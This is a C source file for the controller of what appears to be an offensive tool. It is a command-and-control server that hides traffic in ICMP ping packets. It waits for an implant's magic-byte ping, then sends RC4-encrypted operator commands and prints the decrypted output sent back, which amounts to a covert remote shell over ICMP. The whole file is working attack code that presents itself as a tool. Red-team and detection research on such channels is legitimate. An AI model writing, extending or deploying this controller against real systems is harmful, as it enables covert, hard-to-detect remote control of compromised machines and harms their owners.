#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "../include/c2.h"
#include "../include/utils.h"

// creates a raw ICMP socket and binds it
int create_socket(char *interface_to_bind) {
    int sockfd;
    struct icmp_filter filter;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    // bind it to the interface if specified
    if (interface_to_bind != NULL) {
        if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, interface_to_bind, strlen(interface_to_bind) + 1) < 0) {
            perror("setsockopt()");
            exit(EXIT_FAILURE);
        }
    }

    // attach a filter to the socket to only catch ICMP_ECHO requests only
    filter.data = ~(1 << ICMP_ECHO);
    if (setsockopt(sockfd, SOL_RAW, ICMP_FILTER, &filter, sizeof(filter)) < 0) {
        perror("setsockopt()");
        exit(EXIT_FAILURE);
    }

    return sockfd;
}

// get the input and return it's buffer
int get_command(char *input, unsigned char *cipher_text) {
    size_t input_size;

    write(1, "> ", 2);

    if (fgets(input, BUFFER_SIZE, stdin) == NULL) {
        perror("fgets()");
        return 0;
    }

    input_size = strlen(input);

    input[input_size - 1] = '\0';

    // encrypt the command
    rc4((unsigned char *) input, input_size, (unsigned char *) KEY, KEY_LENGTH, cipher_text);

    return 1;
}

// print from where we got our connection
void print_connection_succeed(char *src_ip) {
    printf("[!] Got a connection from %s\n", src_ip);
    puts("[!] Now you should be able to run your commands");
}

// the actual interaction occurs here
void interact(int sockfd) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    struct sockaddr_in addr; // holds the IP address
    unsigned char packet[PACKET_SIZE]; // holds the ICMP packet
    unsigned char *data; // holds the ICMP packet's data section
    unsigned char cipher_text[BUFFER_SIZE];
    char input[BUFFER_SIZE]; // holds the input buffer
    char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
    ssize_t nbytes;
    size_t data_section_size;


    puts("[+] Waiting for connections...");

    // wait for pings and if we got one we let the implant know
    while (1) {
        if ((read_from_socket(sockfd, packet, PACKET_SIZE) < 0)) {
            goto out;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {
            // convert the binary represenation of the IP address to a string
            inet_ntop(AF_INET, &ip->saddr, src_ip, sizeof(src_ip));

            print_connection_succeed(src_ip);

            addr = prep_ip_headers(ip);

            c2_prep_icmp_headers(icmp, sizeof(struct icmphdr) + 32);

            if (sendto(sockfd, icmp, sizeof(struct icmphdr) + 32, 0, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
                perror("sendto()");
                goto out;
            }

            break; // we got a connection, move to the next loop
        }
    }

    while (1) {
        if (!get_command(input, cipher_text)) {
            continue;
        }

        c2_append_to_data_section(icmp, cipher_text);

        c2_prep_icmp_headers(icmp, strlen((char *) input));

        addr = prep_ip_headers(ip);

        // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
        if (sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
            perror("sendto()");
            break;
        }

        if ((nbytes = read_from_socket(sockfd, packet, PACKET_SIZE)) < 0) {
            break;
        }

        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {
            data = parse_data_section(packet);

            data_section_size = nbytes - (sizeof(struct iphdr) + sizeof(struct icmphdr));

            // decrypt the cipher text (command's output)
            rc4(data, data_section_size, (unsigned char *) KEY, KEY_LENGTH, cipher_text);

            write(1, cipher_text, data_section_size);
        }
    }

out:
    return;
}

// initializes the options and starts the c2
void c2_init_n_call(char *interface_to_bind) {
    int sockfd = create_socket(interface_to_bind);

    interact(sockfd);

    close(sockfd);
}
